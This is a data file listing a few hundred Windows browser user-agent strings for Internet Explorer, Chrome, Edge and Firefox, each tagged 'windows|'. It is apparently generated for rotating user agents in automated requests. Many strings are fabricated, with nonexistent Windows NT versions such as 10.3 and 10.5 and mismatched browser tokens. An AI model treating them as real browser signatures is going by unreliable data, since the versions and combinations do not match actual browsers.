windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.5;; en-US Trident/5.0)
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 6.3; Trident/6.0)
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; WOW64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4;; en-US) AppleWebKit/535.33 (KHTML, like Gecko) Chrome/51.0.3595.177 Safari/535
windows|Mozilla/5.0 (Windows; Windows NT 10.0; x64; en-US) Gecko/20100101 Firefox/51.2
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 10.1; WOW64 Trident/6.0)
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; x64 Trident/6.0)
windows|Mozilla/5.0 (Windows; Windows NT 6.2; Win64; x64; en-US) AppleWebKit/534.8 (KHTML, like Gecko) Chrome/52.0.2874.393 Safari/536
windows|Mozilla/5.0 (Windows; U; Windows NT 6.3;) Gecko/20100101 Firefox/74.2
windows|Mozilla/5.0 (Windows; Windows NT 6.3; x64) AppleWebKit/603.10 (KHTML, like Gecko) Chrome/54.0.1685.168 Safari/533
windows|Mozilla/5.0 (Windows NT 10.5; Win64; x64; en-US) AppleWebKit/603.7 (KHTML, like Gecko) Chrome/47.0.3272.230 Safari/535.7 Edge/9.45143
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2;) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/48.0.1022.386 Safari/537.5 Edge/12.89535
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0; x64; en-US) Gecko/20100101 Firefox/70.7
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64) AppleWebKit/600.36 (KHTML, like Gecko) Chrome/52.0.1849.129 Safari/534
windows|Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64; en-US) AppleWebKit/601.23 (KHTML, like Gecko) Chrome/48.0.3410.182 Safari/602.6 Edge/13.70051
windows|Mozilla/5.0 (Windows NT 6.3; Win64; x64) Gecko/20100101 Firefox/65.8
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 10.3; Win64; x64; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows; Windows NT 6.0; WOW64) AppleWebKit/600.32 (KHTML, like Gecko) Chrome/53.0.3145.253 Safari/601
windows|Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.12 (KHTML, like Gecko) Chrome/50.0.1026.372 Safari/534.5 Edge/10.22892
windows|Mozilla/5.0 (Windows; Windows NT 10.2; WOW64) AppleWebKit/603.7 (KHTML, like Gecko) Chrome/52.0.3529.229 Safari/535.6 Edge/15.54389
windows|Mozilla/5.0 (Windows NT 6.1; Win64; x64; en-US) AppleWebKit/601.3 (KHTML, like Gecko) Chrome/52.0.1752.337 Safari/537
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1; Win64; x64) AppleWebKit/535.26 (KHTML, like Gecko) Chrome/48.0.2746.162 Safari/601
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.2; Trident/7.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; Win64; x64; en-US) Gecko/20100101 Firefox/51.3
windows|Mozilla/5.0 (Windows; Windows NT 10.5; WOW64) Gecko/20130401 Firefox/68.0
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 6.1; x64 Trident/6.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0; Win64; x64) AppleWebKit/601.11 (KHTML, like Gecko) Chrome/50.0.2899.292 Safari/600
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0;; en-US) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/51.0.1956.177 Safari/600.4 Edge/16.54965
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.3; x64 Trident/7.0)
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 10.1; WOW64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows NT 6.0; WOW64; en-US) AppleWebKit/537.41 (KHTML, like Gecko) Chrome/48.0.3965.121 Safari/601.0 Edge/16.59799
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0; WOW64) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/50.0.1726.330 Safari/603.4 Edge/18.50748
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.3; Win64; x64; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows NT 6.1;) Gecko/20130401 Firefox/48.7
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 10.5; Win64; x64; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.2; WOW64) Gecko/20100101 Firefox/55.8
windows|Mozilla/5.0 (Windows; Windows NT 6.0; WOW64; en-US) Gecko/20100101 Firefox/57.1
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1; WOW64) Gecko/20130401 Firefox/66.7
windows|Mozilla/5.0 (Windows NT 10.5; x64; en-US) Gecko/20100101 Firefox/55.2
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 10.5; Trident/4.0)
windows|Mozilla/5.0 (Windows NT 6.0; Win64; x64; en-US) AppleWebKit/533.29 (KHTML, like Gecko) Chrome/48.0.1205.261 Safari/603.8 Edge/11.25879
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1; WOW64; en-US) AppleWebKit/600.26 (KHTML, like Gecko) Chrome/51.0.2287.138 Safari/533.1 Edge/8.35421
windows|Mozilla/5.0 (Windows NT 10.1;; en-US) Gecko/20100101 Firefox/74.5
windows|Mozilla/5.0 (Windows NT 10.4; WOW64; en-US) AppleWebKit/533.32 (KHTML, like Gecko) Chrome/53.0.3673.121 Safari/602
windows|Mozilla/5.0 (Windows; Windows NT 10.0;; en-US) Gecko/20130401 Firefox/61.7
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64) AppleWebKit/603.9 (KHTML, like Gecko) Chrome/55.0.3848.288 Safari/603.2 Edge/17.51074
windows|Mozilla/5.0 (Windows; U; Windows NT 10.5; Win64; x64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/47.0.1207.157 Safari/535.9 Edge/13.80979
windows|Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/533.9 (KHTML, like Gecko) Chrome/49.0.2200.387 Safari/601
windows|Mozilla/5.0 (Windows; U; Windows NT 10.5; WOW64; en-US) AppleWebKit/601.5 (KHTML, like Gecko) Chrome/50.0.1457.299 Safari/535.4 Edge/16.21858
windows|Mozilla/5.0 (Windows; Windows NT 6.3; WOW64) Gecko/20130401 Firefox/68.3
windows|Mozilla/5.0 (Windows; Windows NT 6.3; x64) AppleWebKit/602.23 (KHTML, like Gecko) Chrome/54.0.1780.275 Safari/600
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0; x64; en-US) Gecko/20100101 Firefox/68.8
windows|Mozilla/5.0 (Windows; Windows NT 10.1; Win64; x64; en-US) AppleWebKit/533.18 (KHTML, like Gecko) Chrome/49.0.3912.259 Safari/600
windows|Mozilla/5.0 (Windows; Windows NT 10.3;; en-US) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/55.0.1973.140 Safari/602
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2; WOW64; en-US) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/50.0.3131.307 Safari/533.1 Edge/17.55888
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; WOW64 Trident/6.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; x64) Gecko/20100101 Firefox/56.1
windows|Mozilla/5.0 (Windows; Windows NT 6.2; x64) AppleWebKit/603.20 (KHTML, like Gecko) Chrome/50.0.1517.170 Safari/602.6 Edge/16.91601
windows|Mozilla/5.0 (Windows NT 6.2; x64) AppleWebKit/535.33 (KHTML, like Gecko) Chrome/55.0.2173.385 Safari/601.7 Edge/18.18288
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 10.1; x64 Trident/5.0)
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 6.1; Win64; x64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows; Windows NT 6.1;) Gecko/20100101 Firefox/64.0
windows|Mozilla/5.0 (Windows NT 6.0; x64; en-US) AppleWebKit/535.17 (KHTML, like Gecko) Chrome/52.0.1527.249 Safari/535
windows|Mozilla/5.0 (Windows; Windows NT 6.0;; en-US) AppleWebKit/533.36 (KHTML, like Gecko) Chrome/54.0.1159.258 Safari/601
windows|Mozilla/5.0 (Windows NT 6.0; x64) AppleWebKit/533.44 (KHTML, like Gecko) Chrome/54.0.3474.354 Safari/534
windows|Mozilla/5.0 (Windows NT 6.0; x64; en-US) AppleWebKit/536.33 (KHTML, like Gecko) Chrome/51.0.3393.175 Safari/601
windows|Mozilla/5.0 (Windows; Windows NT 6.1;) Gecko/20100101 Firefox/46.4
windows|Mozilla/5.0 (Windows NT 6.3; x64) AppleWebKit/601.12 (KHTML, like Gecko) Chrome/54.0.3006.391 Safari/601.1 Edge/10.42918
windows|Mozilla/5.0 (Windows; U; Windows NT 6.3;) Gecko/20130401 Firefox/71.3
windows|Mozilla/5.0 (Windows; Windows NT 10.5;) AppleWebKit/602.22 (KHTML, like Gecko) Chrome/54.0.3829.129 Safari/533.2 Edge/17.62120
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64 Trident/4.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; WOW64) Gecko/20100101 Firefox/47.7
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0; x64) AppleWebKit/600.27 (KHTML, like Gecko) Chrome/50.0.3323.163 Safari/536.9 Edge/17.40318
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.0;; en-US Trident/7.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0; WOW64; en-US) AppleWebKit/533.38 (KHTML, like Gecko) Chrome/48.0.3319.266 Safari/535
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1;) Gecko/20100101 Firefox/52.6
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2;) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/53.0.2768.338 Safari/536
windows|Mozilla/5.0 (Windows; Windows NT 6.1;) Gecko/20130401 Firefox/45.5
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 6.3;; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64; en-US) AppleWebKit/601.37 (KHTML, like Gecko) Chrome/48.0.3606.187 Safari/601
windows|Mozilla/5.0 (Windows NT 10.3; Win64; x64; en-US) Gecko/20130401 Firefox/69.3
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2;) AppleWebKit/601.26 (KHTML, like Gecko) Chrome/55.0.3956.340 Safari/534.9 Edge/15.70881
windows|Mozilla/5.0 (Windows NT 6.1; Win64; x64) Gecko/20100101 Firefox/62.9
windows|Mozilla/5.0 (Windows NT 6.3; WOW64; en-US) AppleWebKit/600.16 (KHTML, like Gecko) Chrome/52.0.1715.357 Safari/601.1 Edge/16.49193
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; WOW64) Gecko/20100101 Firefox/68.3
windows|Mozilla/5.0 (Windows; U; Windows NT 10.5; x64) Gecko/20100101 Firefox/50.7
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3; Win64; x64; en-US) AppleWebKit/602.36 (KHTML, like Gecko) Chrome/47.0.3736.183 Safari/602.7 Edge/14.54149
windows|Mozilla/5.0 (Windows; Windows NT 6.3; x64) AppleWebKit/535.5 (KHTML, like Gecko) Chrome/48.0.2633.256 Safari/536.0 Edge/14.50036
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 10.4; x64; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows NT 10.5; WOW64; en-US) AppleWebKit/602.6 (KHTML, like Gecko) Chrome/51.0.2583.145 Safari/533.2 Edge/9.82897
windows|Mozilla/5.0 (Windows; Windows NT 6.1;) AppleWebKit/536.26 (KHTML, like Gecko) Chrome/54.0.3667.190 Safari/535
windows|Mozilla/5.0 (Windows NT 6.1;) AppleWebKit/603.27 (KHTML, like Gecko) Chrome/55.0.1559.157 Safari/600.5 Edge/10.48918
windows|Mozilla/5.0 (Windows; Windows NT 10.1; x64) Gecko/20130401 Firefox/53.8
windows|Mozilla/5.0 (Windows NT 6.3; x64) Gecko/20100101 Firefox/69.3
windows|Mozilla/5.0 (Windows; Windows NT 6.0;) AppleWebKit/533.35 (KHTML, like Gecko) Chrome/55.0.1680.301 Safari/533
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; en-US Trident/5.0)
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 10.3; Trident/6.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.2; WOW64) Gecko/20100101 Firefox/72.2
windows|Mozilla/5.0 (Windows; Windows NT 10.2; WOW64) Gecko/20100101 Firefox/72.1
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 6.3; x64 Trident/5.0)
windows|Mozilla/5.0 (Windows; Windows NT 6.0; Win64; x64) AppleWebKit/600.11 (KHTML, like Gecko) Chrome/55.0.1258.190 Safari/535
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64; en-US) AppleWebKit/533.10 (KHTML, like Gecko) Chrome/51.0.3486.262 Safari/534.8 Edge/15.33656
windows|Mozilla/5.0 (Windows NT 10.1; Win64; x64; en-US) AppleWebKit/603.23 (KHTML, like Gecko) Chrome/51.0.1470.240 Safari/601
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0;; en-US) Gecko/20130401 Firefox/46.7
windows|Mozilla/5.0 (Windows NT 10.1; WOW64) Gecko/20100101 Firefox/67.9
windows|Mozilla/5.0 (Windows; Windows NT 6.3; WOW64) AppleWebKit/600.25 (KHTML, like Gecko) Chrome/52.0.3591.296 Safari/603
windows|Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64) AppleWebKit/603.47 (KHTML, like Gecko) Chrome/54.0.2656.330 Safari/601.6 Edge/18.83372
windows|Mozilla/5.0 (Windows NT 6.1;) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/48.0.3941.219 Safari/535
windows|Mozilla/5.0 (Windows NT 10.5; x64; en-US) AppleWebKit/536.47 (KHTML, like Gecko) Chrome/51.0.3467.229 Safari/600.5 Edge/15.69722
windows|Mozilla/5.0 (Windows NT 6.2;) AppleWebKit/601.31 (KHTML, like Gecko) Chrome/52.0.2243.138 Safari/535
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64 Trident/6.0)
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 10.4; Trident/4.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0;) AppleWebKit/601.3 (KHTML, like Gecko) Chrome/50.0.3315.363 Safari/534
windows|Mozilla/5.0 (Windows; Windows NT 6.2; Win64; x64) AppleWebKit/535.36 (KHTML, like Gecko) Chrome/52.0.3505.192 Safari/535
windows|Mozilla/5.0 (Windows NT 6.3; Win64; x64) Gecko/20100101 Firefox/62.0
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 6.3;; en-US Trident/5.0)
windows|Mozilla/5.0 (Windows NT 10.1;; en-US) Gecko/20100101 Firefox/64.8
windows|Mozilla/5.0 (Windows; Windows NT 6.1; Win64; x64; en-US) Gecko/20100101 Firefox/63.8
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; WOW64; en-US) AppleWebKit/601.14 (KHTML, like Gecko) Chrome/50.0.3341.157 Safari/600.4 Edge/17.64867
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; x64; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows NT 10.2;) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/52.0.1435.155 Safari/537
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 6.0; Trident/6.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.0; Win64; x64; en-US) Gecko/20100101 Firefox/68.5
windows|Mozilla/5.0 (Windows NT 10.1;) AppleWebKit/603.38 (KHTML, like Gecko) Chrome/51.0.1401.156 Safari/600.0 Edge/10.19338
windows|Mozilla/5.0 (Windows; Windows NT 6.3; x64) AppleWebKit/601.11 (KHTML, like Gecko) Chrome/47.0.1541.363 Safari/536.2 Edge/14.80335
windows|Mozilla/5.0 (Windows; Windows NT 10.1; WOW64) Gecko/20100101 Firefox/66.7
windows|Mozilla/5.0 (Windows; Windows NT 6.3; WOW64) AppleWebKit/536.8 (KHTML, like Gecko) Chrome/48.0.2362.165 Safari/601
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0; Win64; x64) AppleWebKit/602.36 (KHTML, like Gecko) Chrome/54.0.2760.101 Safari/602.0 Edge/17.62922
windows|Mozilla/5.0 (Windows; Windows NT 6.0; Win64; x64) Gecko/20100101 Firefox/50.8
windows|Mozilla/5.0 (Windows; Windows NT 10.0;; en-US) Gecko/20100101 Firefox/68.0
windows|Mozilla/5.0 (Windows NT 10.4; Win64; x64) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/54.0.3367.377 Safari/600
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; x64; en-US) AppleWebKit/603.41 (KHTML, like Gecko) Chrome/51.0.1386.212 Safari/603
windows|Mozilla/5.0 (Windows NT 6.3;) AppleWebKit/601.28 (KHTML, like Gecko) Chrome/49.0.1053.365 Safari/601.7 Edge/18.71690
windows|Mozilla/5.0 (Windows; Windows NT 10.3; WOW64) Gecko/20100101 Firefox/62.1
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1;) Gecko/20100101 Firefox/61.3
windows|Mozilla/5.0 (Windows; Windows NT 10.4; Win64; x64; en-US) AppleWebKit/536.28 (KHTML, like Gecko) Chrome/50.0.2809.262 Safari/534.7 Edge/11.74885
windows|Mozilla/5.0 (Windows; Windows NT 10.2; x64; en-US) Gecko/20100101 Firefox/68.9
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0;; en-US) AppleWebKit/534.32 (KHTML, like Gecko) Chrome/54.0.2032.370 Safari/600
windows|Mozilla/5.0 (Windows NT 10.3; x64) AppleWebKit/536.39 (KHTML, like Gecko) Chrome/54.0.3717.119 Safari/533
windows|Mozilla/5.0 (Windows NT 10.2; WOW64; en-US) AppleWebKit/601.23 (KHTML, like Gecko) Chrome/48.0.3345.265 Safari/601.9 Edge/11.48115
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 6.0; Trident/5.0)
windows|Mozilla/5.0 (Windows NT 10.3;; en-US) AppleWebKit/533.18 (KHTML, like Gecko) Chrome/53.0.3418.178 Safari/601
windows|Mozilla/5.0 (Windows NT 6.3; x64; en-US) AppleWebKit/603.34 (KHTML, like Gecko) Chrome/54.0.3532.294 Safari/533
windows|Mozilla/5.0 (Windows NT 10.1; x64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/53.0.2899.270 Safari/536
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; x64; en-US) AppleWebKit/536.7 (KHTML, like Gecko) Chrome/47.0.1610.378 Safari/600
windows|Mozilla/5.0 (Windows; U; Windows NT 6.3; WOW64; en-US) Gecko/20100101 Firefox/58.8
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.4; x64 Trident/5.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; WOW64; en-US) AppleWebKit/534.9 (KHTML, like Gecko) Chrome/55.0.3742.190 Safari/533.6 Edge/12.35605
windows|Mozilla/5.0 (Windows NT 10.3; x64) AppleWebKit/535.13 (KHTML, like Gecko) Chrome/52.0.2398.384 Safari/601.5 Edge/18.15484
windows|Mozilla/5.0 (Windows; U; Windows NT 6.3; Win64; x64; en-US) Gecko/20130401 Firefox/63.6
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.1; WOW64 Trident/4.0)
windows|Mozilla/5.0 (Windows; Windows NT 6.2; Win64; x64; en-US) AppleWebKit/603.22 (KHTML, like Gecko) Chrome/51.0.2163.139 Safari/601
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 10.3; WOW64; en-US Trident/5.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; WOW64; en-US) AppleWebKit/535.47 (KHTML, like Gecko) Chrome/50.0.3285.344 Safari/600.3 Edge/8.76042
windows|Mozilla/5.0 (Windows; Windows NT 10.4; x64; en-US) Gecko/20100101 Firefox/66.2
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; x64; en-US) AppleWebKit/533.14 (KHTML, like Gecko) Chrome/51.0.1002.159 Safari/602.5 Edge/13.15899
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1;) AppleWebKit/533.14 (KHTML, like Gecko) Chrome/54.0.1522.164 Safari/601.8 Edge/18.33539
windows|Mozilla/5.0 (Windows NT 6.1; x64) AppleWebKit/601.35 (KHTML, like Gecko) Chrome/55.0.1544.351 Safari/535
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 6.3; Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.3; Trident/7.0)
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 6.2; Trident/6.0)
windows|Mozilla/5.0 (Windows NT 10.0; WOW64; en-US) AppleWebKit/533.38 (KHTML, like Gecko) Chrome/49.0.1236.395 Safari/535
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.1; Trident/7.0)
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 10.2; WOW64; en-US Trident/5.0)
windows|Mozilla/5.0 (Windows NT 10.3;) AppleWebKit/601.26 (KHTML, like Gecko) Chrome/53.0.2701.290 Safari/603
windows|Mozilla/5.0 (Windows NT 10.3; Win64; x64) AppleWebKit/602.8 (KHTML, like Gecko) Chrome/52.0.2105.134 Safari/535
windows|Mozilla/5.0 (Windows NT 10.2; Win64; x64; en-US) AppleWebKit/534.18 (KHTML, like Gecko) Chrome/49.0.1984.315 Safari/601
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 10.0; WOW64 Trident/4.0)
windows|Mozilla/5.0 (Windows NT 6.2; WOW64; en-US) AppleWebKit/601.30 (KHTML, like Gecko) Chrome/53.0.3309.279 Safari/602
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; Win64; x64) AppleWebKit/601.34 (KHTML, like Gecko) Chrome/51.0.3156.363 Safari/602.2 Edge/14.55021
windows|Mozilla/5.0 (Windows; U; Windows NT 6.3;; en-US) AppleWebKit/533.8 (KHTML, like Gecko) Chrome/49.0.2303.109 Safari/601.6 Edge/17.30361
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.2;; en-US Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 6.3;; en-US Trident/5.0)
windows|Mozilla/5.0 (Windows NT 10.1; x64) AppleWebKit/602.11 (KHTML, like Gecko) Chrome/48.0.2841.298 Safari/537
windows|Mozilla/5.0 (Windows NT 10.3; WOW64) AppleWebKit/600.5 (KHTML, like Gecko) Chrome/49.0.3508.339 Safari/601.7 Edge/9.17630
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1; x64) Gecko/20100101 Firefox/47.1
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0; Win64; x64) AppleWebKit/601.47 (KHTML, like Gecko) Chrome/48.0.1137.216 Safari/600
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 6.1; WOW64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows NT 10.3; WOW64) AppleWebKit/534.9 (KHTML, like Gecko) Chrome/49.0.2913.210 Safari/534.8 Edge/17.28162
windows|Mozilla/5.0 (Windows NT 10.1; WOW64; en-US) AppleWebKit/602.33 (KHTML, like Gecko) Chrome/53.0.3065.146 Safari/534
windows|Mozilla/5.0 (Windows NT 6.2;) AppleWebKit/602.14 (KHTML, like Gecko) Chrome/51.0.2798.168 Safari/534.4 Edge/8.45996
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0;; en-US) AppleWebKit/537.6 (KHTML, like Gecko) Chrome/52.0.2444.108 Safari/600
windows|Mozilla/5.0 (Windows; Windows NT 10.3; Win64; x64) Gecko/20100101 Firefox/48.3
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3; Win64; x64; en-US) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/55.0.2332.132 Safari/600
windows|Mozilla/5.0 (Windows; Windows NT 6.0; WOW64) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/55.0.2857.187 Safari/601.3 Edge/12.55575
windows|Mozilla/5.0 (Windows; Windows NT 10.0; Win64; x64) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/52.0.1112.113 Safari/533
windows|Mozilla/5.0 (Windows; Windows NT 10.0; x64; en-US) AppleWebKit/600.15 (KHTML, like Gecko) Chrome/49.0.3442.277 Safari/537
windows|Mozilla/5.0 (Windows; Windows NT 6.0; x64; en-US) AppleWebKit/600.19 (KHTML, like Gecko) Chrome/47.0.2009.207 Safari/601.1 Edge/13.32144
windows|Mozilla/5.0 (Windows NT 10.1;; en-US) AppleWebKit/603.46 (KHTML, like Gecko) Chrome/53.0.1386.274 Safari/537
windows|Mozilla/5.0 (Windows; U; Windows NT 6.3; x64; en-US) AppleWebKit/536.49 (KHTML, like Gecko) Chrome/53.0.1906.341 Safari/600.7 Edge/12.67779
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 10.4; WOW64 Trident/6.0)
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 10.0;; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows NT 10.3; Win64; x64) AppleWebKit/535.5 (KHTML, like Gecko) Chrome/52.0.3131.288 Safari/601.6 Edge/14.68052
windows|Mozilla/5.0 (Windows; Windows NT 10.1; WOW64) AppleWebKit/536.8 (KHTML, like Gecko) Chrome/52.0.3251.245 Safari/534.7 Edge/17.12872
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3; WOW64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/49.0.3196.286 Safari/533
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1; Win64; x64; en-US) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/55.0.1214.389 Safari/533
windows|Mozilla/5.0 (Windows NT 6.3; x64; en-US) Gecko/20100101 Firefox/46.2
windows|Mozilla/5.0 (Windows NT 10.2; WOW64) Gecko/20100101 Firefox/48.9
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 10.5;; en-US Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.0;; en-US Trident/7.0)
windows|Mozilla/5.0 (Windows NT 6.0; x64; en-US) AppleWebKit/535.37 (KHTML, like Gecko) Chrome/53.0.3825.247 Safari/601.0 Edge/10.12360
windows|Mozilla/5.0 (Windows; Windows NT 10.3; Win64; x64; en-US) AppleWebKit/536.1 (KHTML, like Gecko) Chrome/54.0.1673.297 Safari/537.2 Edge/18.98050
windows|Mozilla/5.0 (Windows; Windows NT 6.1;; en-US) Gecko/20100101 Firefox/45.1
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64) AppleWebKit/536.23 (KHTML, like Gecko) Chrome/51.0.3376.380 Safari/603
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.2; WOW64; en-US Trident/7.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.1; x64; en-US) AppleWebKit/600.29 (KHTML, like Gecko) Chrome/47.0.1191.242 Safari/603
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 6.3; Win64; x64 Trident/5.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1;; en-US) AppleWebKit/537.5 (KHTML, like Gecko) Chrome/54.0.3744.336 Safari/533.2 Edge/10.90565
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 10.2; WOW64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3; x64) Gecko/20100101 Firefox/68.9
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 10.4;; en-US Trident/7.0)
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 10.0; Win64; x64 Trident/5.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; Win64; x64) Gecko/20130401 Firefox/63.0
windows|Mozilla/5.0 (Windows NT 6.3; WOW64; en-US) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/53.0.2296.352 Safari/536.4 Edge/16.25588
windows|Mozilla/5.0 (Windows; Windows NT 10.2; Win64; x64) Gecko/20100101 Firefox/50.2
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2;; en-US) AppleWebKit/603.10 (KHTML, like Gecko) Chrome/53.0.1944.230 Safari/600
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64) AppleWebKit/602.37 (KHTML, like Gecko) Chrome/49.0.3895.342 Safari/534
windows|Mozilla/5.0 (Windows NT 10.1; Win64; x64) Gecko/20100101 Firefox/70.1
windows|Mozilla/5.0 (Windows NT 10.2;) AppleWebKit/602.44 (KHTML, like Gecko) Chrome/53.0.1796.362 Safari/535
